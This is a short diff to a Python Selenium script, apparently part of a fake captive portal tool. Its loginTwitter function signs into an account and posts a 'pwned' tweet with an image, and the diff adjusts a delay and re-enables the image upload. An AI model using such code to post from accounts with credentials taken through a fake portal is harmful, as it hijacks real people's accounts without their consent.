@@ -32,24 +32,24 @@ def loginTwitter(username, password):
     login.click()
 
     # Wait for page to load
-    time.sleep(3)
+    time.sleep(5)
 
     # Write our tweet
     content = browser.find_element_by_id('tweet-box-home-timeline')
     # ...you might have to do this twice if it doesn't respond right away
     content.send_keys("""I just got pwned by a fake captive portal! Don't reuse your credentials!""")
 
-    """
+    #"""
     # Try to attach an image.
 
     img_path = cwd + "/pwned.jpg"
 
     # Attach an image
     browser.find_element_by_css_selector('input.file-input').send_keys(img_path)
-    WebDriverWait(browser, 5).until(
-        EC.presence_of_element_located((By.CSS_SELECTOR, 'button.js-show-preview'))
-    )
-    """
+    #WebDriverWait(browser, 5).until(
+    #    EC.presence_of_element_located((By.CSS_SELECTOR, 'button.js-show-preview'))
+    #)
+    #"""
 
     # Wait for image to upload
     time.sleep(5)
